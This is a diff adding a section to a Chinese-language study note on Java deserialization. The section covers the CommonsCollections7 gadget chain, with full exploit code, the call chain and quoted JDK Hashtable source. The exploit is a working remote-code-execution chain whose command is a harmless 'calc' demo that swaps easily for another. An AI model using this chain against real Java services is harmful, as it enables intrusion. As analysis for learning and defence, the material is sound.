@@ -2265,3 +2265,152 @@ Q：
 A：
 
 否则会在反序列化之前触发payload，导致程序中止。
+
+## CommonsCollections7
+
+### 版本适用范围
+
+commons-collections : 3.1～3.2.1
+
+### Exp展示
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CommonsCollections7 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
+
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+        };
+
+        Map map=new HashMap();
+        Map lazyMap=LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"cc7");
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(tiedMapEntry, "cc7");
+        lazyMap.remove("cc7");
+
+        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc7.out"));
+        objectOutputStream.writeObject(hashtable);
+        objectOutputStream.close();
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc7.out"));
+        objectInputStream.readObject();
+
+    }
+}
+```
+
+### Exp构造分析
+
+#### 利用链展示
+
+```java
+Hashtable.readObject()/Hashtable.reconstitutionPut()
+    TiedMapEntry.hashCode()/TiedMapEntry.getValue()
+        LazyMap.get()
+           ChainedTransformer.transform()
+               InvokerTransformer.transform()
+```
+
+#### Hashtable
+
+```java
+    private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();//2
+        int index = (hash & 0x7FFFFFFF) % tab.length;
+        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) && e.key.equals(key)) {
+                throw new java.io.StreamCorruptedException();
+            }
+        }
+        // Creates the new entry.
+        @SuppressWarnings("unchecked")
+            Entry<K,V> e = (Entry<K,V>)tab[index];
+        tab[index] = new Entry<>(hash, key, value, e);
+        count++;
+    }
+
+    private void readObject(java.io.ObjectInputStream s)
+         throws IOException, ClassNotFoundException
+    {
+        // Read in the threshold and loadFactor
+        s.defaultReadObject();
+
+        // Validate loadFactor (ignore threshold - it will be re-computed)
+        if (loadFactor <= 0 || Float.isNaN(loadFactor))
+            throw new StreamCorruptedException("Illegal Load: " + loadFactor);
+
+        // Read the original length of the array and number of elements
+        int origlength = s.readInt();
+        int elements = s.readInt();
+
+        // Validate # of elements
+        if (elements < 0)
+            throw new StreamCorruptedException("Illegal # of Elements: " + elements);
+
+        // Clamp original length to be more than elements / loadFactor
+        // (this is the invariant enforced with auto-growth)
+        origlength = Math.max(origlength, (int)(elements / loadFactor) + 1);
+
+        // Compute new length with a bit of room 5% + 3 to grow but
+        // no larger than the clamped original length.  Make the length
+        // odd if it's large enough, this helps distribute the entries.
+        // Guard against the length ending up zero, that's not valid.
+        int length = (int)((elements + elements / 20) / loadFactor) + 3;
+        if (length > elements && (length & 1) == 0)
+            length--;
+        length = Math.min(length, origlength);
+
+        if (length < 0) { // overflow
+            length = origlength;
+        }
+
+        // Check Map.Entry[].class since it's the nearest public type to
+        // what we're actually creating.
+        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length);
+        table = new Entry<?,?>[length];
+        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
+        count = 0;
+
+        // Read the number of elements and then all the key/value objects
+        for (; elements > 0; elements--) {
+            @SuppressWarnings("unchecked")
+                K key = (K)s.readObject();
+            @SuppressWarnings("unchecked")
+                V value = (V)s.readObject();
+            // sync is eliminated for performance
+            reconstitutionPut(table, key, value); //1
+        }
+    }
+```
+
+CommonsCollections7和6的区别主要是使用了Hashtable，代码关键在于注释1和2处。
